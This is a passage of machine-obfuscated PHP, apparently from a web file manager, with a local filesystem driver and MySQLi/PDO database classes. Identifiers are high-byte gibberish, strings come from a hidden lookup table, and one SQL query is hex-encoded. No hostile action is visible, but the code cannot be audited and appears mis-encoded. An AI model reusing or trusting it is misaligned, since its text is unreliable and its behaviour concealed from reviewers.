(($£ª„÷ÕÈ = readdir($Ã½¼‡ÆÂ)) !== !1) { if ($£ª„÷ÕÈ == $Øµê²±ú[20] || $£ª„÷ÕÈ == $Øµê²±ú[1357]) { continue; } $´èÑà°£ = $Âê·»¡¦ . $Øµê²±ú[18] . $£ª„÷ÕÈ; if (is_file($´èÑà°£) || is_link($´èÑà°£)) { if (!unlink($´èÑà°£)) { chmod($´èÑà°£, $this->pathAuth); if (!unlink($´èÑà°£)) { return !1; } } } else { if (is_dir($´èÑà°£)) { chmod($´èÑà°£, $this->pathAuth); $´èÑà°£ = $this->iconvApp($´èÑà°£); if (!$this->delFolder($´èÑà°£)) { return !1; } } } } closedir($Ã½¼‡ÆÂ); return rmdir($Âê·»¡¦); } public function rename($¯ÃÃ¤÷î, $íÅïËÌ“) { $’ÀòâïÇ =& $_SERVER[¹àö™Ç¾]; $Ñ•’¾Ù = $this->fileNameAuto($this->pathFather($¯ÃÃ¤÷î), $íÅïËÌ“); $Ñ•’¾Ù = $this->iconvSystem($Ñ•’¾Ù); $¯ÃÃ¤÷î = $this->iconvSystem($¯ÃÃ¤÷î); $’ñ ©¯ = $this->pathFather($¯ÃÃ¤÷î); $¯äªƒ¹æ = rtrim($’ñ ©¯, $’ÀòâïÇ[18]) . $’ÀòâïÇ[18] . $Ñ•’¾Ù; $ëŠ¥–Êë = @rename($¯ÃÃ¤÷î, $¯äªƒ¹æ); $¯äªƒ¹æ = $this->iconvApp($¯äªƒ¹æ); return $ëŠ¥–Êë ? $this->getPathOuter($¯äªƒ¹æ) : !1; } public function size($ÅĞ¥Ø—ü) { $ÅĞ¥Ø—ü = $this->iconvSystem($ÅĞ¥Ø—ü); return filesize_64($ÅĞ¥Ø—ü); } public function info($¤…üœå¡) { $¤…üœå¡ = $this->iconvSystem($¤…üœå¡); if ($this->isFolder($¤…üœå¡)) { return $this->folderInfo($¤…üœå¡); } else { if ($this->isFile($¤…üœå¡)) { return $this->fileInfo($¤…üœå¡); } } return !1; } protected function infoChildren($¦şÚØ€Ø, &$»¤¦­ƒ, $íéê¿×ş = true) { $á…ßåù¹ =& $_SERVER[¹àö™Ç¾]; check_abort_echo(); $¦şÚØ€Ø = rtrim($¦şÚØ€Ø, $á…ßåù¹[18]) . $á…ßåù¹[18]; if ($íéê¿×ş) { $¦şÚØ€Ø = $this->iconvSystem($¦şÚØ€Ø); } if (!($Šœ¬ˆ‘ß = @opendir($¦şÚØ€Ø))) { return; } while (($‚¾ë‘ò— = readdir($Šœ¬ˆ‘ß)) !== !1) { if ($‚¾ë‘ò— == $á…ßåù¹[20] || $‚¾ë‘ò— == $á…ßåù¹[1357]) { continue; } $£â¯½à› = $¦şÚØ€Ø . $‚¾ë‘ò—; if (is_file($£â¯½à›) || is_link($£â¯½à›)) { $»¤¦­ƒ[$á…ßåù¹[91]]++; $»¤¦­ƒ[$á…ßåù¹[90]] += filesize_64($£â¯½à›); } else { if (is_dir($£â¯½à›)) { $»¤¦­ƒ[$á…ßåù¹[92]]++; $this->infoChildren($£â¯½à›, $»¤¦­ƒ, !1); } } } closedir($Šœ¬ˆ‘ß); } private function folderInfo($¾şÌğ«, $§ï›ÉÉ‰ = false) { $ëìˆ¢¸˜ =& $_SERVER[¹àö™Ç¾]; $¾şÌğ« = rtrim($¾şÌğ«, $ëìˆ¢¸˜[18]) . $ëìˆ¢¸˜[18]; $™à˜¸Ì¥ = $this->iconvApp($this->pathThis($¾şÌğ«)); if ($§ï›ÉÉ‰) { return array($ëìˆ¢¸˜[42] => $™à˜¸Ì¥, $ëìˆ¢¸˜[88] => $this->getPathOuter($¾şÌğ«), $ëìˆ¢¸˜[43] => $ëìˆ¢¸˜[89]); } $õœ… ” = array($ëìˆ¢¸˜[42] => $™à˜¸Ì¥, $ëìˆ¢¸˜[88] => $this->getPathOuter($¾şÌğ«), $ëìˆ¢¸˜[43] => $ëìˆ¢¸˜[89], $ëìˆ¢¸˜[203] => @filectime($¾şÌğ«), $ëìˆ¢¸˜[96] => @filemtime($¾şÌğ«), $ëìˆ¢¸˜[1360] => @fileatime($¾şÌğ«), $ëìˆ¢¸˜[1361] => is_readable($¾şÌğ«), $ëìˆ¢¸˜[1362] => is_writable($¾şÌğ«), $ëìˆ¢¸˜[1363] => get_mode($¾şÌğ«)); return $õœ… ”; } private function fileInfo($¹ñ­Ü€, $å¤ƒ¥§• = false) { $ĞúÄıÜ =& $_SERVER[¹àö™Ç¾]; $Â‘ÛÖ¼ã = $this->iconvApp($this->pathThis($¹ñ­Ü€)); if ($å¤ƒ¥§•) { return array($ĞúÄıÜ[42] => $Â‘ÛÖ¼ã, $ĞúÄıÜ[88] => $this->getPathOuter($¹ñ­Ü€), $ĞúÄıÜ[43] => $ĞúÄıÜ[202], $ĞúÄıÜ[90] => $this->size($¹ñ­Ü€), $ĞúÄıÜ[177] => $this->ext($Â‘ÛÖ¼ã)); } $çÉŒÏ­Ë = array($ĞúÄıÜ[42] => $Â‘ÛÖ¼ã, $ĞúÄıÜ[88] => $this->getPathOuter($¹ñ­Ü€), $ĞúÄıÜ[43] => $ĞúÄıÜ[202], $ĞúÄıÜ[203] => @filectime($¹ñ­Ü€), $ĞúÄıÜ[96] => @filemtime($¹ñ­Ü€), $ĞúÄıÜ[1360] => @fileatime($¹ñ­Ü€), $ĞúÄıÜ[90] => $this->size($¹ñ­Ü€), $ĞúÄıÜ[177] => $this->ext($Â‘ÛÖ¼ã), $ĞúÄıÜ[1361] => is_readable($¹ñ­Ü€), $ĞúÄıÜ[1362] => is_writable($¹ñ­Ü€), $ĞúÄıÜ[1363] => get_mode($¹ñ­Ü€)); return $çÉŒÏ­Ë; } public function exist($¸ş•‹ˆç) { $¸ş•‹ˆç = $this->iconvSystem($¸ş•‹ˆç); return @file_exists($¸ş•‹ˆç); } public function isFile($Ğ÷èû›¤) { $Ğ÷èû›¤ = $this->iconvSystem($Ğ÷èû›¤); return @is_file($Ğ÷èû›¤); } public function isFolder($£Úß·Ë) { $£Úß·Ë = $this->iconvSystem($£Úß·Ë); return @is_dir($£Úß·Ë); } public function listPath($Ïò½¢’Ô, $°ÔÄê‚Å = false) { $€¶´Ëşû =& $_SERVER[¹àö™Ç¾]; $Ïò½¢’Ô = $this->iconvSystem($Ïò½¢’Ô); $Ïò½¢’Ô = rtrim($Ïò½¢’Ô, $€¶´Ëşû[18]) . $€¶´Ëşû[18]; $£ü¬èÈ· = array($€¶´Ëşû[87] => array(), $€¶´Ëşû[86] => array()); if (!($¸‚ÉÓãÒ = @opendir($Ïò½¢’Ô))) { return $£ü¬èÈ·; } while (($²áùÎ¬¹ = readdir($¸‚ÉÓãÒ)) !== !1) { if ($²áùÎ¬¹ == $€¶´Ëşû[20] || $²áùÎ¬¹ == $€¶´Ëşû[1357]) { continue; } $òöŞªƒ = $Ïò½¢’Ô . $²áùÎ¬¹; if (is_file($òöŞªƒ)) { $£ü¬èÈ·[$€¶´Ëşû[86]][] = $this->fileInfo($òöŞªƒ, $°ÔÄê‚Å); } else { $£ü¬èÈ·[$€¶´Ëşû[87]][] = $this->folderInfo($òöŞªƒ, $°ÔÄê‚Å); } } closedir($¸‚ÉÓãÒ); return $£ü¬èÈ·; } public function listAll($Ò º§æÌ, &$Ê³³ãá = array()) { $ÓéÊ¸¥Ä =& $_SERVER[¹àö™Ç¾]; $Ò º§æÌ = $this->iconvSystem($Ò º§æÌ); $Ò º§æÌ = rtrim($Ò º§æÌ, $ÓéÊ¸¥Ä[18]) . $ÓéÊ¸¥Ä[18]; if (!($…á‰è = @opendir($Ò º§æÌ))) { return $Ê³³ãá; } while (($£û´ÅÆ = readdir($…á‰è)) !== !1) { if ($£û´ÅÆ == $ÓéÊ¸¥Ä[20] || $£û´ÅÆ == $ÓéÊ¸¥Ä[1357]) { continue; } $¡¼¸Ù½ = $Ò º§æÌ . $£û´ÅÆ; if (is_dir($¡¼¸Ù½) && !is_link($¡¼¸Ù½)) { $Ê³³ãá[] = array($ÓéÊ¸¥Ä[88] => $¡¼¸Ù½ . $ÓéÊ¸¥Ä[18], $ÓéÊ¸¥Ä[89] => 1, $ÓéÊ¸¥Ä[96] => @filemtime($¡¼¸Ù½), $ÓéÊ¸¥Ä[90] => 0); $this->listAll($¡¼¸Ù½, $Ê³³ãá); } else { $Ê³³ãá[] = array($ÓéÊ¸¥Ä[88] => $¡¼¸Ù½, $ÓéÊ¸¥Ä[89] => 0, $ÓéÊ¸¥Ä[96] => @filemtime($¡¼¸Ù½), $ÓéÊ¸¥Ä[90] => $this->size($¡¼¸Ù½)); } } closedir($…á‰è); return $Ê³³ãá; } public function has($ÜÕ²‘¯, $ÒŒı‰´¹ = false, $ ›™ıÀ = true) { $½„ÔÔĞ¡ =& $_SERVER[¹àö™Ç¾]; $ÜÕ²‘¯ = $this->iconvSystem($ÜÕ²‘¯); $ÜÕ²‘¯ = rtrim($ÜÕ²‘¯, $½„ÔÔĞ¡[18]) . $½„ÔÔĞ¡[18]; if (!($ÎŒ¹ÁñÇ = @opendir($ÜÕ²‘¯))) { return !1; } $š—êıºÒ = 0; $ğàá«¸ = 0; $°ã×ªãğ = 0; while (($ğÄ…ã ¹ = readdir($ÎŒ¹ÁñÇ)) !== !1) { if ($ğÄ…ã ¹ == $½„ÔÔĞ¡[20] || $ğÄ…ã ¹ == $½„ÔÔĞ¡[1357]) { continue; } $Ö“¥â¤â = $ÜÕ²‘¯ . $ğÄ…ã ¹; if ($ÒŒı‰´¹) { $°ã×ªãğ++; if (@is_file($Ö“¥â¤â)) { $š—êıºÒ++; } else { $ğàá«¸++; } if ($°ã×ªãğ > 10000) { break; } continue; } if ($ ›™ıÀ) { if (@is_file($Ö“¥â¤â)) { return !0; } } else { if (@is_dir($Ö“¥â¤â . $½„ÔÔĞ¡[18])) { return !0; } } } closedir($ÎŒ¹ÁñÇ); if ($ÒŒı‰´¹) { return array($½„ÔÔĞ¡[212] => $š—êıºÒ, $½„ÔÔĞ¡[213] => $ğàá«¸); } return !1; } public function hashSimple($™œÉ­Ä») { $Î–ôÕğà =& $_SERVER[¹àö™Ç¾]; if (!$™œÉ­Ä») { return md5($Î–ôÕğà[22]); } $™œÉ­Ä» = $this->iconvSystem($™œÉ­Ä»); $ı’Ô¡´ù = $this->size($™œÉ­Ä»); $¿öØˆÔº = 200; $ÙŠô£Æ = 50; if ($ı’Ô¡´ù <= $¿öØˆÔº * $ÙŠô£Æ) { return $this->hashMd5($™œÉ­Ä») . $ı’Ô¡´ù; } $–ˆâÅêı = $Î–ôÕğà[22]; $£Û¶ÂÕ¹ = intval($ı’Ô¡´ù / $ÙŠô£Æ); $£ÒËÀ• = fopen($™œÉ­Ä», $Î–ôÕğà[1364]); if (!$£ÒËÀ•) { return $–ˆâÅêı; } for ($Ôú¨„«· = 0; $Ôú¨„«· < $ÙŠô£Æ; $Ôú¨„«·++) { fseek_64($£ÒËÀ•, $£Û¶ÂÕ¹ * $Ôú¨„«·); $–ˆâÅêı .= fread($£ÒËÀ•, $¿öØˆÔº); } fseek_64($£ÒËÀ•, $ı’Ô¡´ù - $¿öØˆÔº); $–ˆâÅêı .= fread($£ÒËÀ•, $¿öØˆÔº); fclose($£ÒËÀ•); return md5($–ˆâÅêı) . $ı’Ô¡´ù; } public function getContent($ŒÀ…È¿²) { $ŒÀ…È¿² = $this->iconvSystem($ŒÀ…È¿²); return file_get_contents($ŒÀ…È¿²); } public function setContent($ÅºÛ‰³Ü, $ÎÇ»ïµ¼ = '') { $ÅºÛ‰³Ü = $this->iconvSystem($ÅºÛ‰³Ü); $ŸóçáÒŞ = @file_put_contents($ÅºÛ‰³Ü, $ÎÇ»ïµ¼, LOCK_EX); clearstatcache(); @chmod($ÅºÛ‰³Ü, $this->pathAuth); return $ŸóçáÒŞ === !1 ? !1 : !0; } public function fileSubstr($…“ÂÜ¦‘, $€êŒ´´ = 0, $Üœ”àºı = false) { $î¬Ì™º’ =& $_SERVER[¹àö™Ç¾]; $…“ÂÜ¦‘ = $this->iconvSystem($…“ÂÜ¦‘); if ($Üœ”àºı === !1) { $Üœ”àºı = $this->size($…“ÂÜ¦‘); } if ($Üœ”àºı <= 0) { return $î¬Ì™º’[22]; } $ª¦šÏÁ† = fopen($…“ÂÜ¦‘, $î¬Ì™º’[1364]); if (!$ª¦šÏÁ†) { return !1; } fseek_64($ª¦šÏÁ†, $€êŒ´´); $Ä•›·¾Š = fread($ª¦šÏÁ†, $Üœ”àºı); fclose($ª¦šÏÁ†); return $Ä•›·¾Š; } public function upload($¡¥¼·Û, $™ ÊÁšõ, $´Â€ïÃö = false, $Œ‡ÖÉæ¨ = REPEAT_REPLACE) { if ($´Â€ïÃö) { return $this->moveFile($™ ÊÁšõ, $¡¥¼·Û); } return $this->copyFile($™ ÊÁšõ, $¡¥¼·Û); } public function setModifyTime($Ì™çœî , $Çä¿ëÛÃ = '') { @touch($Ì™çœî , intval($Çä¿ëÛÃ)); } public function download($åñ¡‡İú, $¤…Åá¹) { return $this->iconvSystem($åñ¡‡İú); } } goto EŒ  Ö‡«; FŠº´•Õù¿: class DbMysqli extends Db { public function __construct($¸¨åø¨Û = '') { $˜İòí =& $_SERVER[¹àö™Ç¾]; if (!extension_loaded($˜İòí[897])) { think_exception(think_lang($˜İòí[24]) . $˜İòí[898]); } if (!empty($¸¨åø¨Û)) { $this->config = $¸¨åø¨Û; if (empty($this->config[$˜İòí[27]])) { $this->config[$˜İòí[27]] = $˜İòí[22]; } } } public function connect($¡±¬®‚Ï = '', $İÓùúÆÜ = 0) { $ûºÅê„· =& $_SERVER[¹àö™Ç¾]; if (!isset($this->linkID[$İÓùúÆÜ])) { if (empty($¡±¬®‚Ï)) { $¡±¬®‚Ï = $this->config; } $this->linkID[$İÓùúÆÜ] = new mysqli($¡±¬®‚Ï[$ûºÅê„·[871]], $¡±¬®‚Ï[$ûºÅê„·[873]], $¡±¬®‚Ï[$ûºÅê„·[874]], $¡±¬®‚Ï[$ûºÅê„·[31]], $¡±¬®‚Ï[$ûºÅê„·[872]] ? intval($¡±¬®‚Ï[$ûºÅê„·[872]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ø®…ÊîŠ = $this->linkID[$İÓùúÆÜ]->server_version; $this->linkID[$İÓùúÆÜ]->query($ûºÅê„·[875] . think_config($ûºÅê„·[876]) . $ûºÅê„·[68]); if ($Ø®…ÊîŠ > $ûºÅê„·[877]) { $this->linkID[$İÓùúÆÜ]->query($ûºÅê„·[878]); } $this->connected = !0; if (1 != think_config($ûºÅê„·[32])) { unset($this->config); } } return $this->linkID[$İÓùúÆÜ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($…‘ßÓ³) { $¨í¤®öÅ =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…‘ßÓ³; if ($this->queryID) { $this->free(); } think_action_status($¨í¤®öÅ[33], 1); think_status($¨í¤®öÅ[34]); $this->queryID = $this->_linkID->query($…‘ßÓ³); if ($this->_linkID->more_results()) { while (($Áâ°¤¡å = $this->_linkID->next_result()) != NULL) { $Áâ°¤¡å->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($µë¥ƒåø) { $©ëù£üí =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µë¥ƒåø; if ($this->queryID) { $this->free(); } think_action_status($©ëù£üí[35], 1); think_status($©ëù£üí[34]); $Ãõë®®‰ = $this->_linkID->query($µë¥ƒåø); $this->debug(); if (!1 === $Ãõë®®‰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¼«ªö¹Ò = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¼«ªö¹Ò) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ë€¿ˆ„Ó = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ë€¿ˆ„Ó) { $this->error(); return !1; } } return !0; } private function getAll() { $Ô¿ùÏ¬ = array(); if ($this->numRows > 0) { for ($¡İ£äÆ = 0; $¡İ£äÆ < $this->numRows; $¡İ£äÆ++) { $Ô¿ùÏ¬[$¡İ£äÆ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ô¿ùÏ¬; } public function getFields($§”ÜöĞ) { $úÕÔŠØÍ =& $_SERVER[¹àö™Ç¾]; $©Š¢Úİİ = $this->query($úÕÔŠØÍ[882] . $this->parseKey($§”ÜöĞ)); $øˆ³½Ó§ = array(); if ($©Š¢Úİİ) { foreach ($©Š¢Úİİ as $ÉÄò¯ì™ => $í„ùïç¨) { $øˆ³½Ó§[$í„ùïç¨[$úÕÔŠØÍ[41]]] = array($úÕÔŠØÍ[42] => $í„ùïç¨[$úÕÔŠØÍ[41]], $úÕÔŠØÍ[43] => $í„ùïç¨[$úÕÔŠØÍ[44]], $úÕÔŠØÍ[45] => (bool) ($í„ùïç¨[$úÕÔŠØÍ[46]] === $úÕÔŠØÍ[22]), $úÕÔŠØÍ[47] => $í„ùïç¨[$úÕÔŠØÍ[48]], $úÕÔŠØÍ[49] => strtolower($í„ùïç¨[$úÕÔŠØÍ[50]]) == $úÕÔŠØÍ[51], $úÕÔŠØÍ[52] => strtolower($í„ùïç¨[$úÕÔŠØÍ[53]]) == $úÕÔŠØÍ[54]); } } return $øˆ³½Ó§; } public function getTables($Ú„©øºû = '') { $û¦´¦Ä =& $_SERVER[¹àö™Ç¾]; $¬Ô…üçñ = !empty($Ú„©øºû) ? $û¦´¦Ä[884] . $Ú„©øºû . $û¦´¦Ä[885] : $û¦´¦Ä[886]; $¥ŒóÃëÃ = $this->query($¬Ô…üçñ); $õâÑí¶ = array(); if ($¥ŒóÃëÃ) { foreach ($¥ŒóÃëÃ as $ÀİĞŞ®‰ => $•³çÔ²‡) { $õâÑí¶[$ÀİĞŞ®‰] = current($•³çÔ²‡); } } return $õâÑí¶; } public function replace($ÜÌ¨²¸, $À±½«‡ = array()) { $Îå¿«Ã­ =& $_SERVER[¹àö™Ç¾]; foreach ($ÜÌ¨²¸ as $ÀÏæúŒŞ => $æ×àÒ­) { $¡¤äµåû = $this->parseValue($æ×àÒ­); if (is_scalar($¡¤äµåû)) { $ÍÀ•ë¢é[] = $¡¤äµåû; $•µï×¦[] = $this->parseKey($ÀÏæúŒŞ); } } $ü°ÂïÆ = $Îå¿«Ã­[887] . $this->parseTable($À±½«‡[$Îå¿«Ã­[283]]) . $Îå¿«Ã­[888] . implode($Îå¿«Ã­[60], $•µï×¦) . $Îå¿«Ã­[889] . implode($Îå¿«Ã­[60], $ÍÀ•ë¢é) . $Îå¿«Ã­[890]; return $this->execute($ü°ÂïÆ); } public function insertAll($ÃøŞú›¦, $ÒÖ¦Œ¨³ = array(), $…øõïüÂ = false) { $Â¢ËĞŸ =& $_SERVER[¹àö™Ç¾]; if (!is_array($ÃøŞú›¦[0])) { return !1; } $ ¡…™ñ› = array_keys($ÃøŞú›¦[0]); $„‹áÂ´½ = array(); foreach ($ÃøŞú›¦ as $†˜öæŞ£) { $¼ş¹âˆì = array(); foreach ($†˜öæŞ£ as $’„†Ó’Ù => $ŠØÛÈÁï) { $ŠØÛÈÁï = $this->parseValue($ŠØÛÈÁï); if (is_scalar($ŠØÛÈÁï)) { $¼ş¹âˆì[] = $ŠØÛÈÁï; } } $„‹áÂ´½[] = $Â¢ËĞŸ[264] . implode($Â¢ËĞŸ[60], $¼ş¹âˆì) . $Â¢ËĞŸ[890]; } array_walk($ ¡…™ñ›, array($this, $Â¢ËĞŸ[891])); $œÔ£¼û› = $…øõïüÂ ? $Â¢ËĞŸ[892] : $Â¢ËĞŸ[893]; $Ñ’Ú­™æ = $œÔ£¼û› . $Â¢ËĞŸ[894] . $this->parseTable($ÒÖ¦Œ¨³[$Â¢ËĞŸ[283]]) . $Â¢ËĞŸ[888] . implode($Â¢ËĞŸ[60], $ ¡…™ñ›) . $Â¢ËĞŸ[895] . implode($Â¢ËĞŸ[60], $„‹áÂ´½); return $this->execute($Ñ’Ú­™æ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $øí—à˜Š =& $_SERVER[¹àö™Ç¾]; $this->error = $this->_linkID->errno . $øí—à˜Š[4] . $this->_linkID->error; if ($øí—à˜Š[22] != $this->queryStr) { $this->error .= LNG($øí—à˜Š[58]) . $this->queryStr; } think_trace($this->error, $øí—à˜Š[22], $øí—à˜Š[59]); return $this->error; } public function escapeString($ÊïÆÈÄ³) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÊïÆÈÄ³); } else { return addslashes($ÊïÆÈÄ³); } } public function parseKey(&$ ±ŠÕê³, $«èäÑ’ = true) { $–„¥ˆ¸€ =& $_SERVER[¹àö™Ç¾]; if ($«èäÑ’) { $ ±ŠÕê³ = $this->parseKeyCheck($ ±ŠÕê³); } if ($ ±ŠÕê³ != $–„¥ˆ¸€[191] && !preg_match($–„¥ˆ¸€[896], $ ±ŠÕê³)) { $ ±ŠÕê³ = $–„¥ˆ¸€[389] . trim($ ±ŠÕê³, $–„¥ˆ¸€[389]) . $–„¥ˆ¸€[389]; } return $ ±ŠÕê³; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ù—„‰›å = '') { $‡ªë—å =& $_SERVER[¹àö™Ç¾]; if (!class_exists($‡ªë—å[899])) { think_exception(think_lang($‡ªë—å[24]) . $‡ªë—å[900]); } if (!empty($Ù—„‰›å)) { $this->config = $Ù—„‰›å; if (empty($this->config[$‡ªë—å[27]])) { $this->config[$‡ªë—å[27]] = array(); } } } public function connect($í÷ŒŒ‚¹ = '', $À¯ÄÜêú = 0) { $™¦òÏ =& $_SERVER[¹àö™Ç¾]; if (!isset($this->linkID[$À¯ÄÜêú])) { if (empty($í÷ŒŒ‚¹)) { $í÷ŒŒ‚¹ = $this->config; } $ñÀûëşÅ = !empty($í÷ŒŒ‚¹[$™¦òÏ[27]][$™¦òÏ[28]]) ? $í÷ŒŒ‚¹[$™¦òÏ[27]][$™¦òÏ[28]] : $this->pconnect; if ($ñÀûëşÅ) { $í÷ŒŒ‚¹[$™¦òÏ[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$À¯ÄÜêú] = new PDO($í÷ŒŒ‚¹[$™¦òÏ[901]], $í÷ŒŒ‚¹[$™¦òÏ[873]], $í÷ŒŒ‚¹[$™¦òÏ[874]], $í÷ŒŒ‚¹[$™¦òÏ[27]]); } catch (PDOException $ èíúäÜ) { think_exception($ èíúäÜ->getMessage()); } $this->dbType = $this->_getDsnType($í÷ŒŒ‚¹[$™¦òÏ[901]]); if (in_array($this->dbType, array($™¦òÏ[902], $™¦òÏ[903], $™¦òÏ[904], $™¦òÏ[905]))) { think_exception($™¦òÏ[906] . $this->dbType . $™¦òÏ[907] . $this->dbType . $™¦òÏ[908]); } if (!$this->linkID[$À¯ÄÜêú]) { think_exception($™¦òÏ[909]); } try { $this->linkID[$À¯ÄÜêú]->exec($™¦òÏ[910] . think_config($™¦òÏ[876])); } catch (Exception $ èíúäÜ) { } $this->connected = !0; if (1 != think_config($™¦òÏ[32])) { unset($this->config); } } return $this->linkID[$À¯ÄÜêú]; } public function free() { $this->PDOStatement = null; } public function query($­Á‘ÏÕè, $˜ÊÆÍ™¢ = array()) { $»‚¸¸ŠË =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­Á‘ÏÕè; if (!empty($˜ÊÆÍ™¢)) { $this->queryStr .= $»‚¸¸ŠË[911] . print_r($˜ÊÆÍ™¢, !0) . $»‚¸¸ŠË[912]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($»‚¸¸ŠË[33], 1); think_status($»‚¸¸ŠË[34]); $this->PDOStatement = $this->_linkID->prepare($­Á‘ÏÕè); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¾…•»À = $this->PDOStatement->execute($˜ÊÆÍ™¢); $this->debug(); if (!1 === $¾…•»À) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÒæÆ¢†, $…ô×±ÎÒ = array()) { $á®¬ª–Æ =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÒæÆ¢†; if (!empty($…ô×±ÎÒ)) { $this->queryStr .= $á®¬ª–Æ[911] . print_r($…ô×±ÎÒ, !0) . $á®¬ª–Æ[912]; } $óıÂ÷Ø = !1; if ($this->dbType == $á®¬ª–Æ[905]) { if (preg_match($á®¬ª–Æ[913], $this->queryStr, $Ü«¾¿ºø)) { $this->table = think_config($á®¬ª–Æ[914]) . str_ireplace(think_config($á®¬ª–Æ[915]), $á®¬ª–Æ[382], $Ü«¾¿ºø[2]); $óıÂ÷Ø = (bool) $this->query($á®¬ª–Æ[916] . strtoupper($this->table) . $á®¬ª–Æ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($á®¬ª–Æ[35], 1); think_status($á®¬ª–Æ[34]); $this->PDOStatement = $this->_linkID->prepare($ÒæÆ¢†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ºÌ´…ñ… = $this->PDOStatement->execute($…ô×±ÎÒ); $this->debug(); if (!1 === $ºÌ´…ñ…) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($óıÂ÷Ø || preg_match($á®¬ª–Æ[917], $ÒæÆ¢†)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Üúóã›Æ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Üúóã›Æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $§Úöü‰¯ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$§Úöü‰¯) { $this->error(); return !1; } } return !0; } private function getAll() { $Åı¼ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Åı¼); return $Åı¼; } public function getFields($¼ÃÆÙ®œ) { $•Öï˜¹ =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!0); if (think_config($•Öï˜¹[918])) { $ò¬¹éŠ = str_replace($•Öï˜¹[919], $¼ÃÆÙ®œ, think_config($•Öï˜¹[918])); } else { switch ($this->dbType) { case $•Öï˜¹[902]: case $•Öï˜¹[920]: $ò¬¹éŠ = "\123\105\114\105\x43\x54\40\x20\x20\143\x6f\x6c\165\x6d\x6e\x5f\x6e\141\155\x65\40\141\x73\x20\x27\x4e\141\x6d\x65\47\54\x20\x20\x20\x64\141\164\x61\x5f\164\171\160\145\40\141\x73\x20\47\x54\x79\x70\145\47\54\x20\40\x20\143\x6f\x6c\x75\x6d\x6e\x5f\144\x65\x66\x61\165\x6c\x74\40\141\163\x20\x27\x44\x65\x66\141\x75\x6c\164\x27\54\x20\x20\x20\x69\163\137\x6e\x75\x6c\x6c\x61\x62\154\x65\x20\141\163\x20\x27\116\x75\154\x6c\x27\12\x9\x9\106\122\x4f\x4d\11\151\x6e\x66\157\162\155\141\164\x69\157\156\137\x73\143\150\x65\x6d\x61\56\x74\x61\142\x6c\x65\163\x20\101\123\x20\x74\xa\11\11\x4a\117\111\116\11\x69\156\x66\x6f\x72\x6d\x61\164\151\157\x6e\137\x73\143\x68\x65\x6d\x61\x2e\x63\157\x6c\165\155\x6e\163\40\101\123\x20\143\12\x9\x9\117\x4e\x20\x20\x74\56\x74\141\x62\154\145\x5f\143\x61\164\141\154\x6f\x67\x20\75\40\143\x2e\164\x61\142\154\145\x5f\143\141\x74\141\x6c\x6f\x67\12\x9\11\x41\x4e\104\x20\164\x2e\164\141\142\x6c\x65\x5f\x73\x63\x68\145\x6d\x61\40\75\x20\x63\56\164\x61\142\x6c\145\x5f\x73\143\150\x65\155\x61\12\11\x9\101\116\x44\x20\x74\x2e\164\x61\142\x6c\145\137\x6e\x61\x6d\x65\x20\x3d\x20\x63\x2e\x74\x61\x62\154\145\x5f\x6e\141\x6d\x65\12\11\x9\127\x48\105\x52\105\40\40\x20\x74\56\x74\141\142\x6c\145\x5f\156\x61\155\145\x20\75\x20\47{$¼ÃÆÙ®œ}\47"; break; case $•Öï˜¹[921]: $ò¬¹éŠ = $•Öï˜¹[922] . $¼ÃÆÙ®œ . $•Öï˜¹[923]; break; case $•Öï˜¹[903]: case $•Öï˜¹[905]: $ò¬¹éŠ = $•Öï˜¹[924] . $•Öï˜¹[925] . $•Öï˜¹[926] . strtoupper($¼ÃÆÙ®œ) . $•Öï˜¹[927] . strtoupper($¼ÃÆÙ®œ) . $•Öï˜¹[928]; break; case $•Öï˜¹[929]: $ò¬¹éŠ = $•Öï˜¹[930] . $¼ÃÆÙ®œ . $•Öï˜¹[931]; break; case $•Öï˜¹[904]: break; case $•Öï˜¹[932]: default: $ò¬¹éŠ = $•Öï˜¹[933] . ($this->dbType == $•Öï˜¹[932] ? "\140{$¼ÃÆÙ®œ}\140" : $¼ÃÆÙ®œ); } } $˜ÑµÁØÙ = $this->query($ò¬¹éŠ); $Òª¢ ¿É = array(); if ($˜ÑµÁØÙ) { foreach ($˜ÑµÁØÙ as $’Îâ¨Ş => 